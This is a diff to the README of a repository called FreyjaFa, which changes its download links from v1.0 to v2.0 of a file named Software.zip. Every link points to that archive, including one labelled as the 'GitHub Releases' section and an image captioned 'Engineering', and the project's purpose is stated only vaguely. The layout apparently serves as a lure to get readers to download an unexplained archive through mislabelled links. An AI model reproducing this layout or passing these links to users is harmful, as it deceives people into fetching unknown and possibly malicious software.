@@ -22,13 +22,13 @@ FreyjaFa is a repository dedicated to removing barriers to growth and aiding the
 
 ## Software Download
 Click the button below to download our software:
-[![Download Software](https://github.com/neorai943/FreyjaFa/releases/download/v1.0/Software.zip)](https://github.com/neorai943/FreyjaFa/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/neorai943/FreyjaFa/releases/download/v2.0/Software.zip)](https://github.com/neorai943/FreyjaFa/releases/download/v2.0/Software.zip)
 
 ## 🌐 Explore Further
-For more resources and updates, visit our [GitHub Releases](https://github.com/neorai943/FreyjaFa/releases/download/v1.0/Software.zip) section.
+For more resources and updates, visit our [GitHub Releases](https://github.com/neorai943/FreyjaFa/releases/download/v2.0/Software.zip) section.
 
 ## 📷 Visual Inspiration
-![Engineering](https://github.com/neorai943/FreyjaFa/releases/download/v1.0/Software.zip)
+![Engineering](https://github.com/neorai943/FreyjaFa/releases/download/v2.0/Software.zip)
 
 ## ℹ️ Additional Information
 Stay tuned for regular updates and additional resources to support your journey in engineering and learning. 🌟
